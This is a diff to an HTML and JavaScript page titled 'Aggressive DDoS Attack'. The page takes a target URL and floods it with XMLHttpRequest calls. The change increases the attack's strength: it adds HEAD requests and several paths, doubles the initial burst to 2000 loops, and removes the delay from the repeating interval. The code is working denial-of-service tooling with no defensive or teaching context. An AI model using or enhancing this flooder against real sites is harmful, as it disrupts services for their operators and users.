@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Optimized Aggressive DDoS Attack</title>
+    <title>Aggressive DDoS Attack</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -52,7 +52,7 @@
     </style>
 </head>
 <body>
-    <h1>Optimized Aggressive DDoS Attack</h1>
+    <h1>Aggressive DDoS Attack</h1>
     <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
     <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
     <div id="status"></div>
@@ -84,9 +84,9 @@
         }
 
         function startAttack(targetURL) {
-            function sendRequest(method, endpoint) {
+            function sendRequest(method, path) {
                 const xhr = new XMLHttpRequest();
-                xhr.open(method, endpoint, true);
+                xhr.open(method, targetURL + path, true);
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4) {
                         consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
@@ -95,27 +95,21 @@
                 xhr.send();
             }
 
-            // Endpoints to target
-            const endpoints = [
-                targetURL,
-                `${targetURL}/api`,
-                `${targetURL}/admin`,
-                `${targetURL}/login`
-            ];
-
-            // Reduced initial burst to 1000 requests for each method and endpoint
-            for (let i = 0; i < 1000; i++) {
-                ['GET', 'POST'].forEach(method => {
-                    endpoints.forEach(endpoint => sendRequest(method, endpoint));
+            // Initial burst of 2000 requests for each method and path
+            const methods = ['HEAD', 'GET', 'POST'];
+            const paths = ['/', '/index.html', '/api', '/randompath'];
+            for (let i = 0; i < 2000; i++) {
+                methods.forEach(method => {
+                    paths.forEach(path => sendRequest(method, path));
                 });
             }
 
-            // Aggressive looping with a slight delay to optimize performance
+            // Aggressive looping for each method and path
             attackInterval = setInterval(() => {
-                ['GET', 'POST'].forEach(method => {
-                    endpoints.forEach(endpoint => sendRequest(method, endpoint));
+                methods.forEach(method => {
+                    paths.forEach(path => sendRequest(method, path));
                 });
-            }, 10);  // Slight delay to optimize performance
+            }, 0);
         }
 
         function stopAttack() {
